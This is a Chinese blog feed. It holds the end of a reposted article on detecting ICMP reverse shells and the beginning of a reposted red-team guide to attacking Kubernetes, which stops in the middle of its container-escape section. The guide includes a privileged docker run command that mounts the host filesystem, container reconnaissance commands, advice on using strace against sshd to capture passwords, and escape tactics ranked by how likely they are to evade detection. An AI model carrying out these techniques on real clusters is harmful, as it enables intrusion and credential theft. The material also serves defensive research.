ICMP反弹shell特征检测"></a>4.3 ICMP反弹shell特征检测</h4><p>对于正常的ping命令产生的数据，有以下特点：</p><p>● 每秒发送的数据包个数比较少，通常每秒最多只会发送两个数据包；</p><p>● 请求数据包与对应的响应数据包内容一样；</p><p>● 数据包中payload的大小固定，windows下为32bytes，linux下为48bytes；</p><p>● 数据包中payload的内容固定，windows下为abcdefghijklmnopqrstuvwabcdefghi，linux下为!”#$%&amp;’()+,-.&#x2F;01234567，如果指定ping发送的长度，则为不断重复的固定字符串；</p><p>● type类型只有2种，0和8。0为请求数据，8为响应数据。</p><p>对于ICMP隧道产生的数据，有以下特点：</p><p>● 每秒发送的数据包个数比较多，在同一时间会产生成百上千个 ICMP 数据包；</p><p>● 请求数据包与对应的响应数据包内容不一样；</p><p>● 数据包中 payload的大小可以是任意大小；</p><p>● 存在一些type为13&#x2F;15&#x2F;17的带payload的畸形数据包；</p><p>● 个别ICMP隧道工具产生的数据包内容前面会增加 ‘TUNL’ 标记以用于识别隧道。</p><p>因此，根据正常ping和ICMP隧道产生的数据包的特点，可以通过以下几点特征检测ICMP隧道:</p><p>● 检测同一来源数据包的数量。正常ping每秒只会发送2个数据包，而ICMP隧道可以每秒发送很多个；</p><p>● 检测数据包中 payload 的大小。正常ping产生的数据包payload的大小为固定，而ICMP隧道数据包大小可以任意；</p><p>● 检测响应数据包中 payload 跟请求数据包是否不一致。正常ping产生的数据包请求响应内容一致，而ICMP隧道请求响应数据包可以一致，也可以不一致；</p><p>● 检测数据包中 payload 的内容。正常ping产生的payload为固定字符串，ICMP隧道的payload可以为任意；</p><p>● 检测 ICMP 数据包的type是否为0和8。正常ping产生的带payload的数据包，type只有0和8，ICMP隧道的type可以为13&#x2F;15&#x2F;17。</p><p><img src="https://blog.riskivy.com/wp-content/uploads/2019/04/p6.png" alt="图片名称"></p><p>具体实现可参考<a href="https://blog.riskivy.com/%E5%9F%BA%E4%BA%8E%E7%BB%9F%E8%AE%A1%E5%88%86%E6%9E%90%E7%9A%84icmp%E9%9A%A7%E9%81%93%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/">https://blog.riskivy.com/%E5%9F%BA%E4%BA%8E%E7%BB%9F%E8%AE%A1%E5%88%86%E6%9E%90%E7%9A%84icmp%E9%9A%A7%E9%81%93%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/</a></p><h2 id="四、参考链接"><a href="#四、参考链接" class="headerlink" title="四、参考链接"></a>四、参考链接</h2><ol><li><a href="https://home.cnblogs.com/u/LittleHann/">郑瀚Andrew</a>的 <a href="https://www.cnblogs.com/LittleHann/p/12038070.html">反弹Shell原理及检测技术研究</a></li><li><a href="https://thinkycx.me/2019-07-06-how-to-detect-a-reverse-shell.html">https://thinkycx.me/2019-07-06-how-to-detect-a-reverse-shell.html</a></li><li><a href="https://github.com/zhanghaoyil/seesaw">https://github.com/zhanghaoyil/seesaw</a></li><li><a href="https://www.freebuf.com/articles/system/187584.html">https://www.freebuf.com/articles/system/187584.html</a></li><li><a href="https://www.anquanke.com/post/id/99793">https://www.anquanke.com/post/id/99793</a></li><li><a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a></li><li><a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html">https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html</a></li><li><a href="https://www.cnblogs.com/shanmao/archive/2012/12/26/2834210.html">https://www.cnblogs.com/shanmao/archive/2012/12/26/2834210.html</a></li><li><a href="https://xz.aliyun.com/t/6727">https://xz.aliyun.com/t/6727</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
      <tag>linux</tag>
      
      <tag>安全</tag>
      
      <tag>容器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从零开始了解Kubernetes攻防</title>
    <link href="/2023/02/02/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E4%BA%86%E8%A7%A3Kubernetes%E6%94%BB%E9%98%B2/"/>
    <url>/2023/02/02/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E4%BA%86%E8%A7%A3Kubernetes%E6%94%BB%E9%98%B2/</url>
    
    <content type="html"><![CDATA[<h1 id="从零开始了解Kubernetes攻防"><a href="#从零开始了解Kubernetes攻防" class="headerlink" title="从零开始了解Kubernetes攻防"></a>从零开始了解Kubernetes攻防</h1><blockquote><p>本文章转载自neargle大佬在腾讯发表的博客 <strong>《红蓝对抗中的云原生漏洞挖掘及利用实录》</strong> ，详细内容可以查看<a href="https://github.com/neargle/my-re0-k8s-security">https://github.com/neargle/my-re0-k8s-security</a>  或者关注neargle。</p></blockquote><h2 id="0-目录"><a href="#0-目录" class="headerlink" title="0. 目录"></a>0. 目录</h2><ul><li><a href="#%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84kubernetes%E6%94%BB%E9%98%B2">从零开始的Kubernetes攻防</a><ul><li><a href="#0-%E7%9B%AE%E5%BD%95">0. 目录</a><ul><li><a href="#05-%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83%E5%BB%BA%E8%AE%AE">0.5 测试环境建议</a></li></ul></li><li><a href="#1-%E8%83%8C%E6%99%AF">1. 背景</a></li><li><a href="#2-%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E4%B8%AD%E7%9A%84%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8">2. 攻防演练中的云原生安全</a></li><li><a href="#3-%E5%8D%95%E5%AE%B9%E5%99%A8%E7%8E%AF%E5%A2%83%E5%86%85%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">3. 单容器环境内的信息收集</a></li><li><a href="#4-%E5%AE%B9%E5%99%A8%E7%BD%91%E7%BB%9C">4. 容器网络</a></li><li><a href="#5-%E5%85%B3%E4%BA%8E%E9%80%83%E9%80%B8%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B">5. 关于逃逸的那些事</a><ul><li><a href="#51-privileged-%E5%AE%B9%E5%99%A8%E5%86%85-mount-device">5.1. privileged 容器内 mount device</a></li><li><a href="#52-%E6%94%BB%E5%87%BB-lxcfs">5.2. 攻击 lxcfs</a></li><li><a href="#53-%E5%88%9B%E5%BB%BA-cgroup-%E8%BF%9B%E8%A1%8C%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8">5.3. 创建 cgroup 进行容器逃逸</a></li><li><a href="#54%E7%89%B9%E6%AE%8A%E8%B7%AF%E5%BE%84%E6%8C%82%E8%BD%BD%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8">5.4. 特殊路径挂载导致的容器逃逸</a></li><li><a href="#541-docker-in-docker">5.4.1 Docker in Docker</a></li><li><a href="#542-%E6%94%BB%E5%87%BB%E6%8C%82%E8%BD%BD%E4%BA%86%E4%B8%BB%E6%9C%BA-proc-%E7%9B%AE%E5%BD%95%E7%9A%84%E5%AE%B9%E5%99%A8">5.4.2 攻击挂载了主机 &#x2F;proc 目录的容器</a></li><li><a href="#55-sys_ptrace-%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9">5.5. SYS_PTRACE 安全风险</a></li><li><a href="#56-%E5%88%A9%E7%94%A8%E5%A4%A7%E6%9D%83%E9%99%90%E7%9A%84-service-account">5.6. 利用大权限的 Service Account</a></li><li><a href="#57-cve-2020-15257-%E5%88%A9%E7%94%A8">5.7. CVE-2020-15257 利用</a></li><li><a href="#58-runc-cve-2019-5736-%E5%92%8C%E5%AE%B9%E5%99%A8%E7%BB%84%E4%BB%B6%E5%8E%86%E5%8F%B2%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%E7%BB%BC%E8%BF%B0">5.8. runc CVE-2019-5736 和容器组件历史逃逸漏洞综述</a></li><li><a href="#59-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83%E5%92%8C%E9%80%83%E9%80%B8%E6%A6%82%E8%BF%B0">5.9. 内核漏洞提权和逃逸概述</a></li><li><a href="#510-%E5%86%99-staticpod-%E9%80%83%E9%80%B8%E6%88%96%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81">5.10. 写 StaticPod 逃逸或权限维持</a></li></ul></li><li><a href="#6-%E5%AE%B9%E5%99%A8%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E">6. 容器相关组件的历史漏洞</a></li><li><a href="#7-%E5%AE%B9%E5%99%A8%E5%AE%B9%E5%99%A8%E7%BC%96%E6%8E%92%E7%BB%84%E4%BB%B6-api-%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%88%96%E6%9C%AA%E9%89%B4%E6%9D%83">7. 容器、容器编排组件 API 配置不当或未鉴权</a><ul><li><a href="#71-%E7%BB%84%E4%BB%B6%E5%88%86%E5%B7%A5">7.1. 组件分工</a></li><li><a href="#72apiserver">7.2. apiserver</a></li><li><a href="#73-kubelet">7.3. kubelet</a></li><li><a href="#74-dashboard">7.4. dashboard</a></li><li><a href="#75-etcd">7.5. etcd</a></li><li><a href="#76-docker-remote-api">7.6. docker remote api</a></li><li><a href="#77-kubectl-proxy">7.7. kubectl proxy</a></li></ul></li><li><a href="#8-%E5%AE%B9%E5%99%A8%E9%95%9C%E5%83%8F%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98">8. 容器镜像安全问题</a></li><li><a href="#9-%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E6%89%80%E4%BA%A7%E7%94%9F%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98">9. 二次开发所产生的安全问题</a><ul><li><a href="#91-%E5%AF%B9-kubernetes-api-%E7%9A%84%E8%AF%B7%E6%B1%82%E8%BD%AC%E5%8F%91%E6%88%96%E6%8B%BC%E6%8E%A5">9.1. 对 Kubernetes API 的请求转发或拼接</a></li></ul></li><li><a href="#10-serverless">10. Serverless</a></li><li><a href="#101-%E6%96%87%E4%BB%B6%E9%A9%BB%E7%95%99%E5%AF%BC%E8%87%B4%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">10.1. 文件驻留导致命令执行</a></li><li><a href="#102-%E6%94%BB%E5%87%BB%E5%85%AC%E7%94%A8%E5%AE%B9%E5%99%A8--%E9%95%9C%E5%83%8F">10.2. 攻击公用容器 &#x2F; 镜像</a></li><li><a href="#11-devops">11. DevOps</a></li><li><a href="#12-%E4%BA%91%E5%8E%9F%E7%94%9F-api-%E7%BD%91%E5%85%B3">12. 云原生 API 网关</a></li><li><a href="#121-apisix-%E7%9A%84-rce-%E5%88%A9%E7%94%A8">12.1. APISIX 的 RCE 利用</a></li><li><a href="#13-%E5%85%B6%E5%AE%83%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF%E5%92%8C%E6%89%8B%E6%B3%95">13. 其它利用场景和手法</a></li><li><a href="#131-%E4%BB%8E-cronjob-%E8%B0%88%E6%8C%81%E4%B9%85%E5%8C%96">13.1. 从 CronJob 谈持久化</a></li><li><a href="#14-%E8%87%B4%E8%B0%A2">14. 致谢</a></li><li><a href="#15-%E5%BC%95%E7%94%A8">15. 引用</a></li></ul></li></ul><h3 id="0-5-测试环境建议"><a href="#0-5-测试环境建议" class="headerlink" title="0.5 测试环境建议"></a>0.5 测试环境建议</h3><p>测试环境的所有问题钱都能解决，我们可以直接在云厂商上购买一个包含多节点的 Kubernetes 容器集群；但如果只有一台VPS服务器或配置有限的虚拟机环境，那么我建议可以使用 minikube、kind 或 K3s 等工具来搭建一个 Kubernetes 容器集群进行测试。</p><h2 id="1-背景"><a href="#1-背景" class="headerlink" title="1. 背景"></a>1. 背景</h2><p>回顾近几年我在容器、Kubernetes上的探索和沉淀，我们在 2018 年的时候开始正式投入对 Serverless 和容器编排技术在攻防场景的预研，并把相关的沉淀服务于多个腾讯基础设施和产品之上，而在近期内外部的红蓝对抗演练中腾讯蓝军也多次依靠在云原生场景上的漏洞挖掘和漏洞利用，进而突破防御进入到内网或攻破核心靶标。  </p><p>本篇文章我们想聚焦于攻防对抗中所沉淀下来的漏洞，分享我们在多处攻防场景所遇到的云原生相关的漏洞挖掘和漏洞利用实例。</p><p><strong>注：本材料所有内容仅供安全研究和企业安全能力建设参考，请勿用于未授权渗透测试和恶意入侵攻击。</strong>  </p><h2 id="2-攻防演练中的云原生安全"><a href="#2-攻防演练中的云原生安全" class="headerlink" title="2. 攻防演练中的云原生安全"></a>2. 攻防演练中的云原生安全</h2><p>CNCF（云原生计算基金会  Cloud Native Computing Foundation）在对云原生定义的描述中提到 “云原生的代表技术包括容器、服务网格、微服务、不可变基础设施和声明式 API”；</p><p>我们今天所聊到的漏洞和利用手法也紧紧围绕着上述的几类技术和由云原生相关技术所演化出来的多种技术架构进行，包括但不限于容器、服务网格、微服务、不可变基础设施、声明式 API、无服务架构、函数计算、DevOps 等，并涉及研发团队在使用的一些云原生开源组件和自研、二次开发时常见的安全问题。不在 “云原生安全” 这个概念上做过多的延伸和扩展，且提及所有的安全漏洞都在 “腾讯蓝军” 对内对外的攻防演练和漏洞挖掘中有实际的利用经验积累。</p><p>在实际的攻防中我们所进行的攻击路径并非完全契合在 CIS2020 上总结的攻击模型：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftBdfO2wkP8CxGyLPo3g9YnEbsMnrYicqc20yEgrxWVmdLEWUwue54Skw/640?wx_fmt=png" alt="图片"></p><p>因为大部分情况下我们遇到的内网并非完全基于容器技术所构建的，所以内网的起点并不一定是一个权限受限的容器，但攻击的方向和目标却大同小异：为了获取特定靶标的权限、资金和数据，我们一般需要控制更多乃至全部的容器、主机和集群。</p><p>也由于业界云原生实践的发展非常迅速，虽然进入内网之后我们所接触的不一定是全是 Kubernetes 所编排下的容器网络和架构，但基于云原生技术所产生的新漏洞和利用手法往往能帮蓝军打开局面。</p><p>举个例子，当我们通过远控木马获取某个集群管理员 PC 上的 kubeconfig 文件 （一般位于 ~&#x2F;.kube&#x2F;config 目录），此时我们就拥有了管理 Kubernetes 集群的所有能力了，具体能做的事情后面会有更详细的探讨。</p><p>如果此时该集群没有设置严格的 security policy 且目标企业的 HIDS 没有针对容器特性进行一定策略优化的话，那创建一个能获取 NODE 权限的 POD 或许就是一个不错的选择，因为只有这样获取的 shell 才能更方便的在容器母机上进行信息收集，例如 strace 母机 sshd 进程抓取我们想要的用户名和密码、使用 tcpdump 抓取内网系统的管理员登录态等，目前正在运行的容器一般是没有这些权限的。</p><p>以下是这种情况下我们常用的 POD yaml 配置：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftwCHtcUarg5Q2TibAGToyUjjicA79dtZD5WicGABfq5W5Td7yPAaRicHLqg/640?wx_fmt=png" alt="图片"></p><p>如果对 Kubernetes 的 POD 不熟悉，其实上述的配置就比较类似于在想要 ROOT 权限的业务服务器上执行以下 docker 命令:</p><p>docker -H ${host_docker_sock} run -d -it –name neartest_Kubernetes_hashsubix -v “&#x2F;proc:&#x2F;host&#x2F;proc” -v “&#x2F;sys:&#x2F;host&#x2F;sys” -v “&#x2F;:&#x2F;near_sandbox” –network&#x3D;host –privileged&#x3D;true –cap-add&#x3D;ALL alpine:latest &#x2F;bin&#x2F;sh -c tail -f &#x2F;dev&#x2F;null</p><p>执行的结果和作用如下 (注：所有的挂载和选项并非都必须，实战中填写需要的权限和目录即可，此处提供一个较全的参考)：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftgtxzp2bHN2wPiclVFXdjiaI3GThc2EllRLEjqhe5VhQNH4FDsz0srf8g/640?wx_fmt=png" alt="图片"></p><p>当然上述大部分配置都会被多租户集群下的 Kubernetes Security Policy 所拦截，且如果目前主机上的 HIDS 有一定容器安全能力的话，这类配置的容器创建行为也比较容易会被标记为异常行为。</p><p>不过，显然我们在真实的对抗中如果只是想达到执行 strace 抓取 sshd 的目的，配置可以更加简化一点，只需添加 SYS_PTRACE 的 capabilities 即可，我在演习中也正是这么做的。</p><p>因为具有 SYS_PTRACE 权限的容器并且进行 kubectl exec 的行为在实际的研发运维流程中非常常见，是 HIDS 比较不容易察觉的类业务型操作；另外也可以寻找节点上已有该配置的容器和 POD 进行控制，同样是不易被防御团队所察觉的。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftEhyicH6Zpv2lsLiap7t9dLyM2r8QPyLrLaNvOpkmicQZZxwkltSsIiaaPA/640?wx_fmt=png" alt="图片"></p><p>接下来我们也会一个个讨论这类漏洞和手法和我们实际在对抗中遇到的场景。同时，无论是在 CNCF 对云原生的定义里，还是大家对云原生技术最直观的感受，大部分技术同学都会想到容器以及容器编排相关的技术，这里我们就以容器为起始，开启我们今天的云原生安全探索之旅吧~</p><h2 id="3-单容器环境内的信息收集"><a href="#3-单容器环境内的信息收集" class="headerlink" title="3. 单容器环境内的信息收集"></a>3. 单容器环境内的信息收集</h2><p>当我们获取了一个容器的 shell，或许 cat &#x2F;proc&#x2F;1&#x2F;cgroup 是我们首要要执行的。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftGKIPgDbCSJNK6zfH8HMBPGtTt0A7ofib1Ricj5SMtTmM01ItbDpwn8uA/640?wx_fmt=png" alt="图片"></p><p>毕竟从内核角度看容器技术的关键就是 CGroup 和 Namespace，或许应该再加一个 Capabilities。从 CGroup 信息中，不仅可以判断我们是否在容器内，也能很方便判断出当前的容器是否在 Kubernetes 的编排环境中。</p><p>没使用 Kubernetes 的 docker 容器，其 cgroup 信息长这样：</p><p>12:hugetlb:&#x2F;docker&#x2F;9df9278580c5fc365cb5b5ee9430acc846cf6e3207df1b02b9e35dec85e86c36</p><p>而 Kubernetes 默认的，长这样：</p><p>12:hugetlb:&#x2F;kubepods&#x2F;burstable&#x2F;pod45226403-64fe-428d-a419-1cc1863c9148&#x2F;e8fb379159f2836dbf990915511a398a0c6f7be1203e60135f1cbdc31b97c197</p><p>同时，这里的 CGroup 信息也是宿主机内当前容器所对应的 CGroup 路径，在后续的多个逃逸场景中获取 CGroup 的路径是非常重要的。</p><p>同类判断当前 shell 环境是否是容器，并采集容器内信息的还有很多，举个不完全的例子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">ps aux<br><br><span class="hljs-built_in">ls</span> -l .dockerenv<br><br>capsh --<span class="hljs-built_in">print</span><br><br><span class="hljs-built_in">env</span> | grep KUBE<br><br><span class="hljs-built_in">ls</span> -l /run/secrets/Kubernetes.io/<br><br>mount<br><br><span class="hljs-built_in">df</span> -h<br><br><span class="hljs-built_in">cat</span> /etc/resolv.conf<br><br><span class="hljs-built_in">cat</span> /etc/mtab<br><br><span class="hljs-built_in">cat</span> /proc/self/status<br><br><span class="hljs-built_in">cat</span> /proc/self/mounts<br><br><span class="hljs-built_in">cat</span> /proc/net/unix<br><br><span class="hljs-built_in">cat</span> /proc/1/mountinfo<br></code></pre></td></tr></table></figure><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftPaEEMDapm7RgLEpRRPibpPezFWy7K4D44qhOs2UgdRENTicibzaCicFC2g/640?wx_fmt=png" alt="图片"></p><p>其中 capsh –print 获取到信息是十分重要的，可以打印出当前容器里已有的 Capabilities 权限；历史上，我们曾经为了使用 strace 分析业务进程，而先设法进行容器逃逸忘记看当前容器的 Capabilities 其实已经拥有了 ptrace 权限，绕了一个大弯子。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftcgCLWayVj5MuKrHtibFOsoIsWrDc7Onr5cTbzIPXpafkq2hjnAv16Jg/640?wx_fmt=png" alt="图片"></p><p>但是，容器的 SHELL 环境里经常遇到无法安装新工具，且大部分常用工具都在镜像里被精简或阉割了。这时理解工具背后的原理并根据原理达到相同的效果就很重要。</p><p>以 capsh 为例，并非所有的容器镜像里都可以执行 capsh，这时如果想要获取当前容器的  Capabilities 权限信息，可以先 cat &#x2F;proc&#x2F;1&#x2F;status 获取到 Capabilities hex 记录之后，再使用 capsh –decode 解码出 Capabilities 的可读字符串即可。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSft1HBSRN9nBvtlv2iaVEWKYyYdEVx12K1qRjDGeOic5USvFXCaAx23RtvA/640?wx_fmt=png" alt="图片"></p><p>其他如 mount, lsof 等命令也类似。</p><p>另外一个比较常见就是 kubectl 命令的功能复现，很多情况下我们虽然获得了可以访问 APIServer 的网络权限和证书（又或者不需要证书）拥有了控制集群资源的权限，却无法下载或安装一个 kubectl 程序便捷的和 APIServer 通信，此时我们可以配置 kubectl 的 logging 登记，记录本地 kubectl 和测试 APIServer 的请求详情，并将相同的请求包发送给目标的 APIServer 以实现相同的效果。</p><p><code>kubectl create -f cronjob.yaml -v=8</code></p><p>如果需要更详细的信息，也可以提高 logging level, 例如 kubectl -v&#x3D;10 等，其他 Kubernetes 组件也能达到相同的目的。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSft3BicWNtm2RTCWS67EMSES3h6thcljtORdUEWb73W5ibvtHZOve5x18bw/640?wx_fmt=png" alt="图片"></p><h2 id="4-容器网络"><a href="#4-容器网络" class="headerlink" title="4. 容器网络"></a>4. 容器网络</h2><p>以 Kubernetes 为例，容器与容器之间的网络是极为特殊的。虽然大部分经典 IDC 内网的手法和技巧依然可以使用，但是容器技术所构建起来的是全新的内网环境，特别是当企业引入服务网格等云原生技术做服务治理时，整个内网和 IDC 内网的差别就非常大了；因此了解一下 Kubernetes 网络的默认设计是非常重要的，为了避免引入复杂的 Kubernetes 网络知识，我们以攻击者的视角来简述放在蓝军面前的 Kubernetes 网络。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftcXMH816vZg00WRsgnomrkInQYzToiaJU76Rv4wmF7x2srIEiaOXG4dJQ/640?wx_fmt=png" alt="图片"></p><p>从上图可以很直观的看出，当我们获取 Kubernetes 集群内某个容器的 shell，默认情况下我们可以访问以下几个内网里的目标：</p><ol><li><p>相同节点下的其它容器开放的端口</p></li><li><p>其他节点下的其它容器开放的端口</p></li><li><p>其它节点宿主机开放的端口</p></li><li><p>当前节点宿主机开放的端口</p></li><li><p>Kubernetes Service 虚拟出来的服务端口</p></li><li><p>内网其它服务及端口，主要目标可以设定为 APISERVER、ETCD、Kubelet 等</p></li></ol><p>不考虑对抗和安装门槛的话，使用 masscan 和 nmap 等工具在未实行服务网格的容器网络内进行服务发现和端口探测和在传统的 IDC 网络里区别不大；当然，因为 Kubernetes Service 虚拟出来的服务端口默认是不会像容器网络一样有一个虚拟的 veth 网络接口的，所以即使 Kubernetes Service 可以用 IP:PORT 的形式访问到，但是是没办法以 ICMP 协议做 Service 的 IP 发现（Kubernetes Service 的 IP 探测意义也不大）。</p><p>另如果 HIDS、NIDS 在解析扫描请求时，没有针对 Kubernetes 的 IPIP Tunnle 做进一步的解析，可能产生一定的漏报。</p><p>注：若 Kubernetes 集群使用了服务网格，其中最常见的就是 istio，此时服务网格下的内网和内网探测手法变化是比较大的。可以参考引用中：《腾讯蓝军： CIS2020 - Attack in a Service Mesh》；由于 ISTIO 大家接触较少，此处不再展开。</p><p>也因此多租户集群下的默认网络配置是我们需要重点关注的，云产品和开源产品使用容器做多租户集群下的隔离和资源限制的实现并不少见，著名的产品有如 Azure Serverless、Kubeless 等。</p><p>若在设计多租户集群下提供给用户代码执行权限即容器权限的产品时，还直接使用 Kubernetes 默认的网络设计是不合理的且非常危险。</p><p>很明显一点是，用户创建的容器可以直接访问内网和 Kubernetes 网络。在这个场景里，合理的网络设计应该和云服务器 VPS 的网络设计一致，用户与用户之间的内网网络不应该互相连通，用户网络和企业内网也应该进行一定程度的隔离，上图中所有对内的流量路径都应该被切断。把所有用户 POD 都放置在一个 Kubernetes namespace 下就更不应该了。  </p><h2 id="5-关于逃逸的那些事"><a href="#5-关于逃逸的那些事" class="headerlink" title="5. 关于逃逸的那些事"></a>5. 关于逃逸的那些事</h2><p>要更好的理解容器逃逸的手法，应该知道本质上容器内的进程只是一个受限的普通 Linux 进程，容器内部进程的所有行为对于宿主机来说是透明的，这也是众多容器 EDR 产品可以直接在主机或 SideCar 内做容器运行时安全的基础之一。</p><p>我们可以很容易在宿主机用 ps 看到容器进程信息：</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftq0qxLqTBAK3nWHNkMplc0oMG5sxyGVBhR93gDhEvtwGXKjeAQFuKIA/640?wx_fmt=png" alt="图片"></p><p>所以，容器逃逸的本质和硬件虚拟化逃逸的本质有很大的不同 (不包含 Kata Containers 等)，我的理解里容器逃逸的过程是一个受限进程获取未受限的完整权限，又或某个原本受 Cgroup&#x2F;Namespace 限制权限的进程获取更多权限的操作，更趋近于提权。</p><p>而在对抗上，不建议将逃逸的行为当成可以写入宿主机特定文件 (如 &#x2F;etc&#x2F;cron*, &#x2F;root&#x2F;.ssh&#x2F;authorized_keys 等文件) 的行为，应该根据目标选择更趋近与业务行为的手法，容器逃逸的利用手段会比大部分情况下的命令执行漏洞利用要灵活。</p><p>以目标 “获取宿主机上的配置文件” 为例，以下几种逃逸手法在容易在防御团队中暴露的概率从大到小，排序如下(部分典型手法举例，不同的 EDR 情况不同)：</p><ol><li><p>mount &#x2F;etc + write crontab  </p></li><li><p>mount &#x2F;root&#x2F;.ssh + write authorized_keys</p></li><li><p>old CVE&#x2F;vulnerability exploit</p></li><li><p>write cgroup notify_on_release</p></li><li><p>write procfs core_pattern</p></li><li><p>volumeMounts: &#x2F; + chroot</p></li><li><p>remount and rewrite cgroup</p></li><li><p>create ptrace cap container  </p></li><li><p>websocket&#x2F;sock shell + volumeMounts: &#x2F;path</p></li></ol><p>我们来一一看一下利用场景和方法：  </p><h3 id="5-1-privileged-容器内-mount-device"><a href="#5-1-privileged-容器内-mount-device" class="headerlink" title="5.1. privileged 容器内 mount device"></a>5.1. privileged 容器内 mount device</h3><p>使用 privileged 特权容器是业界最常见以及最广为人知的逃逸手法，对容器安全有一定要求的产品一般都会严格限制特权容器的使用和监控。不过依然会有一些著名的云产品犯类似的低级错误，例如微软的 Azure 出现的问题：  </p><p><a href="https://thehackernews.com/2021/01/new-docker-container-escape-bug-affects.html">https://thehackernews.com/2021/01/new-docker-container-escape-bug-affects.html</a></p><p>privileged 特权容器的权限其实有很多，所以也有很多不同的逃逸方式，挂载设备读写宿主机文件是特权容器最常见的逃逸方式之一。</p><p>当你进入 privileged 特权容器内部时，你可以使用 <code>fdisk -l</code> 查看宿主机的磁盘设备：</p><p>fdisk -l</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSftGfNAXmbY6uvBia2ssPzWPZO09zlxyoeQfGY2Et96NickicqVYhYSLgibMA/640?wx_fmt=png" alt="图片"></p><p>如果不在 privileged 容器内部，是没有权限查看磁盘列表并操作挂载的。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSft8w0dfp2xjr4r6BWKCfs5uKpR58aj9YqAsJZPR542xnKC56Tdmiczf1A/640?wx_fmt=png" alt="图片"></p><p>因此，在特权容器里，你可以把宿主机里的根目录 &#x2F; 挂载到容器内部，从而去操作宿主机内的任意文件，例如 crontab config file, &#x2F;root&#x2F;.ssh&#x2F;authorized_keys, &#x2F;root&#x2F;.bashrc 等文件，而达到逃逸的目的。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/JMH1pEQ7qP5lIovB8NLL2Anic3icVltSft2Q8Gdwwz7Kslf31TXMuUu1pPPnCHYGpCDibcltRdeGczics9V11EiaD5Q/640?wx_fmt=png" alt="图片"></p><p>当然这类的文件的读写是 EDR 和 HIDS 重点监控的对象，所以是极易触发告警的；即使 HIDS 不一定有针对容器安全的特性进行优化，对此类的逃逸行为依旧有一些检测能力。</p><h3 id="5-2-攻击-lxcfs"><a href="#5-2-攻击-lxcfs" class="headerlink" title="5.2. 攻击 lxcfs"></a>5.2. 攻击 lxcfs</h3><p>lxcfs 的场景和手法应该是目前业界 HIDS 较少进行覆盖的，我们目前也未在真实的攻防场景中遇到 lxcfs 所导致的容器逃逸利用，学习到这个有趣的场景主要还是来自于 @lazydog 师傅在开源社区和私聊里的分享，他在自己的实际蓝军工作中遇到了 lxcfs 